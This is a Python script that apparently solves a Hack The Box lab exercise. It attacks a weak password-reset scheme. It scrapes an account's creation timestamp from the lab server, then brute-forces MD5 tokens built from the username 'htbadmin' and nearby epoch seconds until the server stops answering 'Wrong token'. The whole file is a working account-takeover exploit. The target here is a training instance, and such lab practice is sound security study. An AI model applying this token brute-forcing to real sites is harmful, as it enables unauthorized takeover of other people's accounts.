from hashlib import md5
import requests
import re
from datetime import datetime, timedelta
from sys import exit
from time import time


url = "http://94.237.49.11:52314/question1/"
now        = 0
start_time = 0
fail_text  = "Wrong token"
username   = "htbadmin"

# Define a regular expression pattern to match the Date header
date_pattern = r'And has been created at (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}[APap][Mm])'

# htbuser post body
data_htbuser = { 
    "submit": "htbuser"
}

# Fetch "now" variable from htbuser
htbuser_res = requests.post(url, data=data_htbuser)

# Use re.search to find the date and time
match = re.search(date_pattern, htbuser_res.text)

if match:
    now = match.group(1)
    datetime_obj = datetime.strptime(now, "%Y-%m-%d %I:%M:%S%p")
    epoch_time_now = int(datetime_obj.timestamp())
    start_time = epoch_time_now - 1000
    print("Date and Time:", epoch_time_now)
else:
    print("Date not found in the HTTP response.")

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, epoch_time_now + 2000):
    # get token md5
    plaintext_reset_token = username + str(x) 
    md5_token = md5(plaintext_reset_token.encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
